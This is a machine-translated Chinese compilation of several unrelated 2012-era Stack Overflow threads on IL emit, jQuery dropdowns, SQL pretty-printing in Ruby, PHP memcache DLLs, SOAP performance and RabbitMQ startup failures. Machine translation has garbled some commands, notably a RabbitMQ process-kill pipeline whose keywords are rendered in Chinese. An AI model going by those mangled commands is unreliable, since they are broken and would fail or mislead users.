这是一项正在进行的工作，我已经创建了一个数组，现在我正准备用它做一些事情，所以我决定存储它（ Stloc_1 ），然后尽快将它推回堆栈（Ldloc_1）这些指令表明 IL 无效，但如果我理解正确，这些指令应该保持堆栈不变。没有这两条指令，IL 可以完美运行。所以我无法理解为什么带有后续推送的弹出不起作用。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-04-27T09:07:09.570

在将值存储在本地之前，您必须使用该[`ILGenerator.DeclareLocal`](http://msdn.microsoft.com/en-us/library/y1xffef4.aspx)方法声明本地。引用不存在的局部变量会导致 JIT 编译器声明程序无效。

# jquery - javascript 或 jQuery 中的组选择选项

> ID：10347726
> 
> 赞同：1
> 
> 时间：2012-04-27T08:57:42.063
> 
> 标签：jquery, option

我想知道是否可以在选择下拉列表中对选项进行分组

所以如果我选择第一个选项，第一个子选项 1 和第一个子选项 2 将填充在第二个选择下拉列表中

这里有一个例子：http: [//jsfiddle.net/atoswchataigner/7ThYY/](http://jsfiddle.net/atoswchataigner/7ThYY/)

```
<!-- RUBRIQUE -->
    <select class="ms-RadioText" title="Rubrique" id="ctl00_DropDownChoice" name="ctl00$DropDownChoice">
            <option value="" selected="selected"></option>
            <option value="first option">first option</option>
            <option value="second option">second option</option>        
    </select> 

    <!-- SOUS/RUBRIQUE -->
    <select class="ms-RadioText" title="Sous-Rubrique" id="ctl00_DropDownChoiceSub" name="ctl00$DropDownChoiceSub" disabled="">
            <option value="" selected="selected"></option>
            <option value="first sub option 1">first sub option 1</option>
            <option value="first sub option 2">first sub option 2</option>
            <option value="second sub option 1">second sub option 1</option>
            <option value="second sub option 2">second sub option 2</option>
    </select> ​

//first option
//first sub option 1
//first sub option 2

//second option
//second sub option 1
//second sub option 2

//replace spaces with _ in values
jQuery(".ms-RadioText > option").each(function () {
            jQuery(this).attr("value", jQuery(this).attr("value").replace(/ /g, "_"));
        });​ 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-27T09:23:00.110

这需要一些 jQuery 的便利工作，但我相信这将证明您正在寻找什么：http: [//jsfiddle.net/7ThYY/39/](http://jsfiddle.net/7ThYY/39/)

您的新 HTML：

```
<!-- RUBRIQUE -->
    <select class="ms-RadioText" title="Rubrique" id="ctl00_DropDownChoice" name="ctl00$DropDownChoice">
            <option value="" selected="selected"></option>
            <option class='first' value="first option">first option</option>
            <option class='second' value="second option">second option</option>        
    </select> 

    <!-- SOUS/RUBRIQUE -->
    <select class="ms-RadioText" title="Sous-Rubrique" id="ctl00_DropDownChoiceSub" name="ctl00$DropDownChoiceSub" disabled>
            <option value="" selected="selected"></option>
            <option class='first' value="first sub option 1">first sub option 1</option>
            <option class='first' value="first sub option 2">first sub option 2</option>
            <option class='second' value="second sub option 1">second sub option 1</option>
            <option class='second' value="second sub option 2">second sub option 2</option> 
```

​和新的jQuery

```
$('#ctl00_DropDownChoice').change(function(){

    //Determine what class the first option is    
    var type = $('option:selected', this).attr('class');

    //enable the second select box
    $('#ctl00_DropDownChoiceSub').removeAttr('disabled');
    $('#ctl00_DropDownChoiceSub option').each(function(){
        //Go through each option and determine if it's the same type as the first box. If not, add it to a div that will hold options not being used
        if( $(this).attr('class') != type )
        {
            $('#optionholder').append( $(this) );
        }
    });

    //Also loop through the div holding the unused options and see if there are any in there that we need
    $('#optionholder option').each(function(){
        if( $(this).attr('class') == type )
        {
            $('#ctl00_DropDownChoiceSub').append( $(this) );
        }
    })
});​ 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-27T09:54:51.803

Hiya**演示这里**有2 个演示：

1)**要隐藏/显示的项目** [http://jsfiddle.net/DPBPC/](http://jsfiddle.net/DPBPC/) (我认为这就是你要找的)

2）&&在这里使用禁用属性：http: [//jsfiddle.net/Y87k5/](http://jsfiddle.net/Y87k5/)

这个代码和复杂性更少的那个怎么样。

请在此处查看一些不错的评论：在 IE 中使用 jQuery “关于删除元素”等[隐藏选择选项...](https://stackoverflow.com/questions/2031740/hide-select-option-in-ie-using-jquery)**或** [style.display='none' 不适用于 chrome 中的选项标签，但它适用于 Firefox](https://stackoverflow.com/questions/2324250/style-display-none-doesnt-work-on-option-tags-in-chrome-but-it-does-in-firefo)

**额外信息**另请注意，它是 select hide 中的一个已知错误：http: [//bugs.jquery.com/ticket/1100](http://bugs.jquery.com/ticket/1100) （但无论如何您的问题已解决 :)）

**在此处使用隐藏/显示项目的 Jquery 代码**

```
//replace spaces with _ in values
jQuery(".ms-RadioText > option").each(function() {

    jQuery(this).attr("value", jQuery(this).attr("value").replace(/ /g, "_"));
});

$('#ctl00_DropDownChoice').change(function() {
    var sel = $(this).val();

    var selCompare = (sel.indexOf('first') != -1) ? "first" : "second";

    if ($(this).val() == "") return false;

    $("#ctl00_DropDownChoiceSub").removeAttr("disabled");

    $('#ctl00_DropDownChoiceSub > option').each(function() {

        if (!($(this).val().indexOf(selCompare) != -1)) {
            $(this).wrap('<span>').hide()
        }

    });

    $('#ctl00_DropDownChoiceSub > span > option').each(function() {

        if (($(this).val().indexOf(selCompare) != -1)) {
            $(this).unwrap("span").show()
        }

    });
});​ 
```

**使用禁用的jQuery代码**

```
 //first option
//first sub option 1
//first sub option 2

//second option
//second sub option 1
//second sub option 2

//replace spaces with _ in values
jQuery(".ms-RadioText > option").each(function () {

   jQuery(this).attr("value", jQuery(this).attr("value").replace(/ /g, "_"));
});

$('#ctl00_DropDownChoice').change(function(){
    var sel = $(this).val();

    var selCompare = (sel.indexOf('first') != -1) ? "first" : "second";   

   if( $(this).val() == ""   )
       return false;

       $("#ctl00_DropDownChoiceSub").removeAttr("disabled");  

      $('#ctl00_DropDownChoiceSub > option').each(function(){

         if( !($(this).val().indexOf(selCompare) != -1) )
        {
           $(this).attr("disabled","disabled");
        }else{
             $(this).removeAttr("disabled");
        }

    });

});​ 
```

# sql - Ruby 中的漂亮打印 SQL

> ID：10347727
> 
> 赞同：18
> 
> 时间：2012-04-27T08:57:44.673
> 
> 标签：sql, ruby-on-rails, ruby, pretty-print

有没有一种简单的方法可以在（rails 3）控制台中**漂亮地打印**随机 SQL？

类似于[awesome_print](https://github.com/michaeldv/awesome_print)，甚至可能是[Pretty Print](http://www.ruby-doc.org/stdlib-1.9.3/libdoc/prettyprint/rdoc/PrettyPrint.html)。

它不必了解所有可能的方言或超级高级。
我真正想要的只是更轻松地**检查 ActiveRecord 生成的 SQL**。

目前我只是**将 SQL 复制到网上**进行格式化，这显然是一个生产力杀手。

我真的很想`query.to_sql.pretty_format_sql`看到更好的输出。

谢谢。

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2012-04-27T10:35:10.900

尝试这个：

```
git clone https://github.com/sonota/anbt-sql-formatter
cd anbt-sql-formatter
rails setup.rb 
```

然后，在 Rails 初始化程序中：

```
# config/initializers/pretty_format_sql.rb
class String
  def pretty_format_sql
    require "anbt-sql-formatter/formatter"
    rule = AnbtSql::Rule.new
    rule.keyword = AnbtSql::Rule::KEYWORD_UPPER_CASE
    %w(count sum substr date).each{|func_name|
      rule.function_names << func_name.upcase
    }
    rule.indent_string = "    "
    formatter = AnbtSql::Formatter.new(rule)
    formatter.format(self)
  end
end 
```

测试：

```
rails console
# Some complex SQL
puts Recipe.joins(:festivity).where(['? BETWEEN festivities.starts_at AND festivities.ends_at', Time.utc(0,Time.now.month,Time.now.day,12,0,0)]).to_sql.pretty_format_sql
SELECT
        "recipes" . *
    FROM
        "recipes" INNER JOIN "festivities"
            ON "festivities" . "id" = "recipes" . "festivity_id"
    WHERE
        (
            '0000-04-27 12:00:00.000000' BETWEEN festivities.starts_at AND festivities.ends_at
        )
 => nil 
```

我把改进留给你（重构：猴子补丁 -> 模块，自定义格式等 :-)）

* * *

## 回答 #2

> 赞同：11
> 
> 时间：2013-08-25T07:55:58.707

第[一个答案](https://stackoverflow.com/a/10349086/676874)`anbt-sql-formatter`的可[作为 gem 使用](http://rubygems.org/gems/anbt-sql-formatter)，您可以使用以下方式安装它：

```
gem install anbt-sql-formatter 
```

这里是一个用法示例：

```
require "anbt-sql-formatter/formatter"
rule = AnbtSql::Rule.new
  formatter = AnbtSql::Formatter.new(rule)

[
"SELECT `col1`, `col2` FROM `table` WHERE ((`col1` = 1) AND (`col2` = 5))",
"SELECT `col1`, `col2` FROM `table` WHERE (`col1` = 1) AND (`col2` = 5)",
"SELECT `col1` FROM `table` WHERE (`col1` IN (SELECT * FROM `table21` WHERE (`col2` = 5)))",
"SELECT `col1` FROM `table` INNER JOIN `tab2` ON (`tab1`.`id` = `tab2`.`id1`) WHERE ((`id` >= 1) AND (`id` <= 5))",
].each{|sql_cmd| 
  puts "======"
  puts sql_cmd
  puts formatter.format(sql_cmd)
} 
```

结果：

```
======
SELECT `col1`, `col2` FROM `table` WHERE ((`col1` = 1) AND (`col2` = 5))
SELECT
        `col1`
        ,`col2`
    FROM
        `table`
    WHERE
        (
            (
                `col1` = 1
            )
            AND (
                `col2` = 5
            )
        )
======
SELECT `col1`, `col2` FROM `table` WHERE (`col1` = 1) AND (`col2` = 5)
SELECT
        `col1`
        ,`col2`
    FROM
        `table`
    WHERE
        (
            `col1` = 1
        )
        AND (
            `col2` = 5
        )
======
SELECT `col1` FROM `table` WHERE (`col1` IN (SELECT * FROM `table21` WHERE (`col2` = 5)))
SELECT
        `col1`
    FROM
        `table`
    WHERE
        (
            `col1` IN (
                SELECT
                        *
                    FROM
                        `table21`
                    WHERE
                        (
                            `col2` = 5
                        )
            )
        )
======
SELECT `col1` FROM `table` INNER JOIN `tab2` ON (`tab1`.`id` = `tab2`.`id1`) WHERE ((`id` >= 1) AND (`id` <= 5))
SELECT
        `col1`
    FROM
        `table` INNER JOIN `tab2`
            ON (
            `tab1`.`id` = `tab2`.`id1`
        )
    WHERE
        (
            (
                `id` >= 1
            )
            AND (
                `id` <= 5
            )
        ) 
```

还有可能扩展规则，例如

```
# User defined additional functions:
%w(count sum substr date coalesce).each{|func_name|
  rule.function_names << func_name.upcase
} 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2018-09-07T21:45:34.630

六年后，这是另一种选择：[https ://github.com/kvokka/pp_sql](https://github.com/kvokka/pp_sql)

“用 anbt-sql-formatter gem 替换标准的 ActiveRecord#to_sql 方法，以便在控制台中输出漂亮的 SQL 代码。Rails 日志也将被格式化。”

在后台使用 anbt-sql-formatter，但使其成为 .to_sql 的默认行为

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2021-12-01T08:29:43.093

有[prettier-plugin-sql](https://www.npmjs.com/package/prettier-plugin-sql)有一个很好的输出，例如

```
SELECT
  DISTINCT "events".*
FROM
  "events"
  INNER JOIN "approvals" ON "approvals"."event_id" = "events"."id"
  LEFT OUTER JOIN "attendances" ON "attendances"."event_id" = "events"."id"
WHERE
  (
    "approvals"."status" = ?
    OR "events"."user_id" = ?
  )
  AND (
    "attendances"."user_id" = ?
    OR "events"."user_id" = ?
  ) 
```

如果你在做之后复制你的 sql 查询`puts Event.something.to_sql`，你可以这样做：

```
pbpaste | prettier --parser sql 
```

# php - 保存对象的对象的 PHP 数组。将变量添加到现有对象

> ID：10347731
> 
> 赞同：0
> 
> 时间：2012-04-27T08:57:48.280
> 
> 标签：php, arrays, object, recursion, loops

我想构建一个有孩子的页面对象数组

我有两个函数，一个是创建父链接。

我遍历父链接并找到孩子。

我想向父链接添加一个属性，它是一组子对象。

如果可能的话，我想递归每个孩子，直到找不到孩子。

我希望这是有道理的。

```
function get_links(){
   $links = array();
   $parent_links = $this->pages_model->get_by_parent(0);//where parent_id = 0;
   $count = 0;
   if(isset($parents_links)&&(count($parent_links)>0)){
       foreach($parent_links as $l){
           $children = $this->get_child_links($l->id);//array _ push results
           if($children != false){
               $l->children = $children;
           }else{
               $l->children = FALSE;
           }
           unset($children);
       }
   }
   return $parent_links;
}

function get_child_links($parent_id){
   $links = $this->pages_model->get_by_parent($parent_id);
   return $links;
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-28T19:30:24.150

首先，不要这样做

```
function get_child_links($parent_id){
   $links = $this->pages_model->get_by_parent($parent_id);
   return $links;
} 
```

做这个

```
function get_child_links($parent_id){
   return $this->pages_model->get_by_parent($parent_id);
} 
```

它会稍微加快引擎的速度

# android - 如何在android中使用ffmpeg项目？

> ID：10347732
> 
> 赞同：1
> 
> 时间：2012-04-27T08:57:54.067
> 
> 标签：android, ffmpeg

> **可能重复：**
> [在 Android 上使用 FFMPEG](https://stackoverflow.com/questions/5164211/use-ffmpeg-on-android)

我如何在android中使用ffmpeg。我想编辑视频文件的帧并再次保存为与提取相同的位置？

# ios - 知道 UITableView 何时完成加载其单元格

> ID：10347737
> 
> 赞同：0
> 
> 时间：2012-04-27T08:58:01.307
> 
> 标签：ios, uitableview

这个问题的目的不是知道 a 何时`UITableView`完成加载其数据（已[在本文](https://stackoverflow.com/questions/1483581/get-notified-when-uitableview-has-finished-asking-for-data)中回答），而是知道 a 何时`UITableView`完成绘制其所有单元格。

使用`visibleCells`里面的属性

```
- (UITableViewCell *)tableView:(UITableView *)iTableView cellForRowAtIndexPath:(NSIndexPath *)indexPath 
```

方法不起作用，因为第一次加载 tableview 时，还没有可见的单元格。

这个想法是在刷新 tableview 时为单元格外观设置动画。

这似乎是一项复杂的任务，但我很惊讶 Apple 没有提供任何委托方法来在 tableview 加载完成时使用。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-27T09:16:05.177

最好试试这个方法，传递`NSArray`你想用给定动画集重新加载的 indexPaths

```
- (void)reloadRowsAtIndexPaths:(NSArray *)indexPaths withRowAnimation:(UITableViewRowAnimation)animation 
```

希望它有效

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-03-22T16:52:39.507

我不相信有一种方法可以指示表格何时加载了它的单元格。但是，您可以实现在表格单元格中绘制动画的目标。

**逻辑：**

1.  UITableView 根据需要显示 UITableViewCells。
2.  每个 UITableViewCell 都是 UIView 的子类。
3.  UIView 有 drawRect，每次绘制视图时都会调用它。
4.  因此，将您的动画放入 UITableViewCell 的 drawRect 方法中，它会在绘制时进行动画处理。

**执行：**

1.  创建 UITableViewCell 的子类，
2.  将此子类应用于您的表格单元格，
3.  添加 drawRect 方法，然后
4.  在 drawRect 方法中实现你的动画。

我在我的一个项目中做到了这一点，效果很好。它在加载或滚动表格以及旋转显示器时绘制动画。使用这种方法，您不需要知道表格何时完成加载——每个单元格在绘制时都会被简单地动画化。

*最后一点——如果你把另一个视图控制器放在你的表格视图之上然后关闭它，你可能需要重新加载表格并将每个 UITableViewCell 设置为 setNeedsDisplay。这将强制为每个 UITableViewCell 再次调用 drawRect。*

# google-chrome-extension - 如何在设置/扩展页面上打开谷歌浏览器

> ID：10347738
> 
> 赞同：3
> 
> 时间：2012-04-27T08:58:04.130
> 
> 标签：google-chrome-extension

我尝试从我的应用程序安装程序/卸载程序中为注销 Chrome 扩展程序铺平道路。

我试图直接在设置/扩展页面中启动 Chrome：

```
Chrome.exe chrome://settings/extensions 
```

但它不起作用。你知道该怎么做吗？

* * *

## 回答 #1

> 赞同：-1
> 
> 时间：2012-04-27T12:11:28.427

转到“ **chrome://settings/browser** ”查找**主页->打开此页面：**在其中 使用“ *chrome://settings/extensions* ”..

所以每次启动 Chrome 时，它​​都会加载扩展页面。

* * *

## 回答 #2

> 赞同：-2
> 
> 时间：2014-03-01T09:58:39.783

也许您可以在地址栏 chrome 上尝试“chrome://apps/”

# c++ - 看不懂 shedskin 生成的代码

> ID：10347741
> 
> 赞同：0
> 
> 时间：2012-04-27T08:58:10.813
> 
> 标签：c++, python, converter

例如，我在 python 中有一个函数，我想转换为 c++（或从 c++ 调用，但我不想依赖 python 解释器）简单的 python 函数

```
//test.py
def my_sum(x,y):
    print "Hello World!"
    return x*x+y 
```

我跑脱皮并有

```
//test.cpp
#include "builtin.hpp"
#include "test.hpp"

namespace __test__ {

str *__name__;

void __init() {
    __name__ = new str("__main__");

}

} // module namespace

int main(int, char **) {
    __shedskin__::__init();
    __shedskin__::__start(__test__::__init);
}

//test.hpp
#ifndef __TEST_HPP
#define __TEST_HPP

using namespace __shedskin__;
namespace __test__ {

extern str *__name__;

} // module namespace
#endif 
```

丑陋的代码并且没有我的函数 my_sum 并且代码依赖于“builtin.hpp”。是否可以仅转换功能？

或者

我想从我的 c++ 代码中调用函数，例如 int sum= py.my_sum(3,5); 我怎样才能做到这一点？

或者

也许我可以从我可以在 c++ 代码中使用的 python 代码做 DLL 或 Lib？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-01T20:22:00.177

请注意 shedskin 对此程序的警告：

```
*WARNING* test.py:1: function my_sum not called! 
```

文档中还提到要使编译工作，应该（直接或间接）调用函数，因为否则无法进行类型推断..如何确定 my_sum 参数的类型，如果甚至没有一个电话给它..？:-)

添加这个，例如：

```
if __name__ == '__main__':
  my_sum(1,1) 
```

使 my_sum 出现在生成的 C++ 代码中，该代码可能被另一个 C++ 程序调用。

# javascript - 在动态创建的表中的每一行中单击按钮以检索相应行的列值

> ID：10347742
> 
> 赞同：0
> 
> 时间：2012-04-27T08:58:10.963
> 
> 标签：javascript, html

//在动态创建的表中的每一行中单击按钮以检索相应行的列值

```
var rowCount = result.rows.length;// to count numrows coming from database
for(var j=1; j<=rowCount; j++)
{
var row = result.rows.item(j-1); // creating rowindex in the table
exercise =row.Exercise; // value from database 
time= row.Time; // value from database 
userid = row.UserId // value from database

var table = document.getElementById("check"); // table id 
var row1 = table.insertRow(j); // Insert Row To Table 

 var cell1 = row1.insertCell(0);
 var element1 = document.createElement("input");
 element1.type = "text";
 element1.value = exercise;
 cell1.appendChild(element1);

 var cell2 = row1.insertCell(1);
 var element2 = document.createElement("input");
 element2.type = "text";
 element2.value = time;
 cell2.appendChild(element2);

 var cell3= row1.insertCell(2);
 var element3 = document.createElement("input");
 element3.type = "button";
 element3.value = "edit";

var cell4= row1.insertCell(3); 
```

var element4= document.createElement("input");

```
element4.value = userid;
cell4.appendChild(element4);
cell4.style.dispalay="none";

element3.addEventListener('click', function () { 
alert('event fired!'); 
// get the userid value of the clicked  button as an alert 
});
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-27T09:13:28.220

尝试为列提供一些行 ID 和类，然后您可以使用

```
jQuery(".your_class").click(function(){
var column_value = jQuery(this).html();
}); 
```

你的意思是这样的吗？

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-27T11:45:56.750

首先为每个元素分配一个唯一的 id。例如：

```
var cell4= row1.insertCell(3);
var element4= document.createElement("input");
element4.type = "text";
element4.value = userId; // from DB
element4.id = "element4-" + j;
cell4.appendChild(element4); 
```

分配您的`edit`按钮 id = j。

```
var cell3= row1.insertCell(2);
var element3 = document.createElement("input");
element3.type = "button";
element3.value = "edit";
element3.id = j;
cell3.appendChild(element3); 
```

然后将 onclick 处理程序分配给 for 循环内的编辑按钮，如下所示：

```
element3.onclick=doSomething; 
```

创建一个函数`doSomething()`

```
function doSomething() {  
   for(var j=1; j<=rowCount; j++)
   {    
       var value = document.getElementById("element" + j + "-" + this.id).value;
       alert(value);
   }
} 
```

希望这可以帮助。

# php - windows - php_memcache.dll - 适用于 PHP 5.4

> ID：10347743
> 
> 赞同：38
> 
> 时间：2012-04-27T08:58:35.803
> 
> 标签：php, windows, dll, memcached

我借用了对我没有帮助的类似线程： [php_memcache.dll for PHP 5.3](https://stackoverflow.com/questions/1511045/php-memcache-dll-for-php-5-3)

我使用适用于 Windows 的最新版本的 easyPHP 设置服务器。随之而来的是 PHP 5.4。我现在正在寻找一个以前对我有用的 memcache.dll 文件，但我收到了这个错误

“PHP 启动：memcache：无法初始化模块。模块编译时使用模块 API=20090626 PHP 编译时使用模块 api=20100525 这些选项需要匹配”

任何指向 PHP 5.4 memcache.dll 文件的链接将不胜感激。

在提到的线程中，他们解决了 5.3 和 pierre 的版本，但我发现只有旧版本的 dll

* * *

## 回答 #1

> 赞同：65
> 
> 时间：2012-09-14T10:31:03.220

我找到了这个链接，它对我有用：

[php_memcache-3.0.8-5.4-ts-vc9-x86.zip](http://windows.php.net/downloads/pecl/releases/memcache/3.0.8/php_memcache-3.0.8-5.4-ts-vc9-x86.zip)

或者，您可以在此处浏览最新版本列表并查找适用版本：

[http://windows.php.net/downloads/pecl/releases/memcache/](http://windows.php.net/downloads/pecl/releases/memcache/)

* * *

## 回答 #2

> 赞同：13
> 
> 时间：2012-10-21T02:57:33.670

我发现了这个：

[http://windows.php.net/downloads/pecl/snaps/memcache/3.0.6/](http://windows.php.net/downloads/pecl/snaps/memcache/3.0.6/)

如果上述方法失败，请尝试以下操作：

[https://www.dropbox.com/sh/sjkuotlz2sl1kpc/v7-QZeFxHR](https://www.dropbox.com/sh/sjkuotlz2sl1kpc/v7-QZeFxHR)

* * *

## 回答 #3

> 赞同：5
> 
> 时间：2013-11-21T19:27:50.740

链接死了试试 [http://windows.php.net/downloads/pecl/releases/memcache/](http://windows.php.net/downloads/pecl/releases/memcache/)

您会在其中找到最新的 memcache dll 版本。下载前你需要知道的：

- 操作系统版本（32 位或 64 位）

- PHP 编译器版本

-线程安全支持

可以使用 phpinfo() 函数轻松检查 PHP 编译器版本和线程安全支持

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2012-05-23T15:06:07.683

感谢 Kevin Horst，在我的 Win7 机器上进行了测试和工作！

**解决方案：** 只需下载托管在 Amazon AWS 上的[静态编译版本，然后解压。](http://stalk.s3-website-eu-west-1.amazonaws.com/php-5.4.0-Win32-VC9-x86.zip)

以下是一些输出`php -i`：

```
phpinfo()
PHP Version => 5.4.0

System => Windows NT xxxx 6.1 build 7601 (Windows 7 Ultimate Edition Service Pack 1) i586
Build Date => Mar  7 2012 14:17:27
Compiler => MSVC9 (Visual C++ 2008)
Architecture => x86
Configure Command => cscript /nologo configure.js  "--enable-cli" "--enable-memcache=shared"
Server API => Command Line Interface
Virtual Directory Support => enabled
Configuration File (php.ini) Path => C:\Windows
Loaded Configuration File => C:\Users\xxxx\Downloads\UniServer\usr\local\php\php.ini
Scan this dir for additional .ini files => (none)
Additional .ini files parsed => (none)
PHP API => 20100412
PHP Extension => 20100525
Zend Extension => 220100525
Zend Extension Build => API220100525,TS,VC9
PHP Extension Build => API20100525,TS,VC9

memcache

memcache support => enabled
Active persistent connections => 0
Version => 2.2.5
Revision => $Revision: 319585 $ 
```

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2014-09-10T18:08:11.303

[您可以在http://windows.php.net/downloads/pecl/releases/](http://windows.php.net/downloads/pecl/releases/)下找到已为 Windows 正式编译的任何 pecl 模块

*   您需要知道您正在运行的 php 版本，即：5.3、5.4、5.5 等等

*   您需要知道您的 php 版本是 32 还是 64 即 x86、x64

*   您需要知道 php 版本是否被编译为线程安全的，即：ts,nts

您可以从具有以下内容的文件中获得的所有信息

```
 <?php phpinfo() 
```

并从网络服务器或从将输出发送到文件的命令行查看它：

```
 php -i > phpinfo.txt 
```

注意：从命令行你得到的 php-cli 女巫的数据很可能是用相同的配置编译的

请注意，有 Memcache 和 Memcached 但从 php 网站只有 memcache 可用

# php - Soap Server - 性能问题（可能与 SQLite 相关）

> ID：10347745
> 
> 赞同：3
> 
> 时间：2012-04-27T08:58:38.687
> 
> 标签：php, performance, sqlite, zend-framework, soap

昨天我发布了关于 SQLite 性能问题的问题（[Zend Db PDO_sqlite 插入和更新查询中的可怕性能](https://stackoverflow.com/questions/10333125/terrible-performance-in-zend-db-pdo-sqlite-insert-and-update-queries)）。经过几次测试似乎只有通过 SoapServer 调用方法时才会出现问题（尝试了原生 PHP SoapServer 和 Zend_Soap_Server 类）。

测试用例 - 调用 10 个使用 SQLite DB INSERT 和 UPDATE DB 操作的方法。

以下是它如何工作的几个案例：

1.通过控制器 - 不使用肥皂服务器。本地主机：~0.3s，远程服务器：~0.3s

2.通过肥皂服务器。第一次通话。本地主机：~1-2s，远程服务器：~7s！

3.通过肥皂服务器。几个电话。本地主机：~1-10s，远程服务器：~7s

第三种情况我不太关心，可能是本地服务器性能问题。重要的是它在远程服务器上工作稳定。

另一方面，简单的 10 次方法调用的 7 秒非常长。显然 - 这 7 秒的一部分是客户端 - 服务器通信，因为案例 1 省略了这一点，但我不认为它应该那么慢！

为了调试，我正在记录所有内容，似乎发生的情况是在案例 1 中调用的相同 SQLite 方法需要 0.00x-0.02 秒，这里持续约 0.15-0.45 秒。

可能是什么问题？使用 SOAP 时速度如此急剧地变慢是正常的吗？（这是我的第一个肥皂服务器项目）。

**编辑：**我发现的另一个重要日志事实：

信息 -2012-04-26 **13:08:07.782679** 类：SoapController。方法：SoapController::hadleWSDL。线路：18。

Information-2012-04-26 **13:08:08.318641** *** 系统启动 ***

所以这基本上是两个方法被调用之间的时间。对我来说，使用少量数据进行超过 0.5 秒的客户端-服务器通信似乎很多。这是 handleWSDL 操作的代码：

```
$options = array(
    'encoding' => 'UTF-8',
    'cache_wsdl' => WSDL_CACHE_BOTH,
    'uri' =>$this->_WSDL_URI
);  
$soap = new Zend_Soap_Server(null, $options); 
$soap->setClass('SoapServerFunction');
$soap->setObject(new SoapServerFunction());
$soap->handle(); 
```

应用程序非常简单——SOAP 方法接受 1 个参数，并在此基础上创建 1 个缓存对象，正在处理数据，并以 XML 格式返回部分数据。

提前感谢您提出任何建议，我可以做些什么来使其更快或如何跟踪减速的真正原因。

最好的祝福！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-13T13:13:38.863

Do you use a FQDN for the server's address? In that case it might actually be DNS-related. You might also want to try everything on a real system and not on a virtual host, as you will not have much control over what the physical system is actually doing.

Secondly, I would recommend installing xdebug and use [kcachegrind](http://kcachegrind.sourceforge.net/html/Home.html) or [wincachegrind](http://sourceforge.net/projects/wincachegrind/), which will give you a much more detailled view of what your system is doing.

Thirdly, you may log slow queries by utilizing PostgreSQLs [pg_stat_statements()](http://www.postgresql.org/docs/8.4/static/pgstatstatements.html).

# rabbitmq - rabbitmq 拒绝启动

> ID：10347751
> 
> 赞同：51
> 
> 时间：2012-04-27T08:59:04.533
> 
> 标签：rabbitmq

我已经安装了 rabbitmq`ubuntu`并尝试使用 启动它`rabbitmq-server start`，但是，我收到了这个错误：

```
Activating RabbitMQ plugins ...

0 plugins activated:

node with name "rabbit" already running on "mybox"

diagnostics:

- nodes and their ports on mybox: [{rabbit,38618},
                                       {rabbitmqprelaunch13346,41776}]
- current node: rabbitmqprelaunch13346@mybox
- current node home dir: /var/lib/rabbitmq
- current node cookie hash: 8QRKGluOJOcZ4AAkEdFwQg== 
```

所以我尝试停止它或重新启动它，`service rabbitmq-server restart`但我收到以下错误：`Restarting rabbitmq-server: RabbitMQ is not running`

服务器的主机名`hostname -s`是 mybox。

如何停止当前正在运行的实例，或者至少如何管理它？我无权访问它，但我无法正确运行 rabbitmq。

谢谢你。

* * *

## 回答 #1

> 赞同：72
> 
> 时间：2012-04-27T09:18:08.557

Rabbitmq 设置为在安装后自动启动。我不认为它是用`service`命令配置运行的。

查看rabbitmq的状态

```
sudo rabbitmqctl status 
```

停止rabbitmq

```
sudo rabbitmqctl stop 
```

（再次尝试 status 命令以查看它是否已停止）。要重新启动它，推荐的方法是

```
sudo invoke-rc.d rabbitmq-server start 
```

这些都适用于使用 apt-get 的 vanilla ubuntu 安装

**还是行不通？**

如果您尝试启动或重新启动rabbitmq 失败，请检查有多少进程正在运行。

```
ps -ef | grep rabbit 
```

应该有 5 个进程以用户 rabbitmq 运行。如果您有更多，特别是如果他们以其他用户（例如 root 或您自己的用户）身份运行，您应该停止这些进程。

最干净的方法可能是重新启动您的机器。

* * *

## 回答 #2

> 赞同：15
> 
> 时间：2015-09-11T12:03:25.643

`rabbitmq-server``hostname -s`如果值已更改，则拒绝启动。

此处建议的解决方案**仅适用于测试/开发环境**。

我不得不删除数据库以在本地修复它。即空文件夹`/var/lib/rabbitmq`（ubuntu）或`/usr/local/var/lib/rabbitmq/`（mac）

* * *

## 回答 #3

> 赞同：10
> 
> 时间：2015-03-09T09:43:26.867

我有类似的问题，但这些建议对我不起作用（也重新启动）。当我运行`rabbitmq-server`命令时，我得到这样的响应：

```
$/ rabbitmq-server

BOOT FAILED
===========

Error description:
   {error,{cannot_log_to_file,"/var/log/rabbitmq/rabbit@haber01.log",
                              {error,eacces}}}
.... 
```

当我检查`/var/log/rabbitmq/rabbit@haber01.log`文件的权限时，我看到该组没有对该文件的写入权限。所以我允许使用该命令进行分组：

```
/var/log/rabbigmq/$ chmod g+w * 
```

那么问题就解决了！

也许这个答案可以帮助某人。

* * *

## 回答 #4

> 赞同：7
> 
> 时间：2019-10-25T05:14:22.757

似乎 Mnesia 数据库已损坏。必须删除它才能`sudo service rabbitmq-server start`重新开始！

> $ **sudo rm -rf /var/lib/rabbitmq/mnesia/**

还要确保在清除之前杀死任何流浪的兔子进程

> $ **ps辅助| grep 兔子 | awk '{打印 $2}' | 须藤 xargs 杀死 -9**

接着

> $ **sudo 服务 rabbitmq-server 启动**

* * *

## 回答 #5

> 赞同：4
> 
> 时间：2017-03-08T20:48:02.167

如果您使用芹菜，您的队列可能会达到最大大小，因此兔子不会启动。也许你甚至不能使用`rabbitmqctl`，所以如果你有能力清理队列，只需删除

`/var/lib/rabbitmq/mnesia/rabbit@<host>/queues`

在 unix 上（在您的系统上查找 mnesia DB 路径）。 **请注意：**这将删除您在 rabbit 中的所有内容，因此这是最后的解决方案。

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2018-02-28T15:54:51.357

查看您尝试启动的节点日志中的内容。它将在 /var/log/rabbitmq/ 在我的情况下是 selinux，rabbit 无法绑定到它的端口。

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2019-03-06T10:55:42.037

如果标准停止和启动不起作用，请列出正在运行的 rabbitmq 进程

```
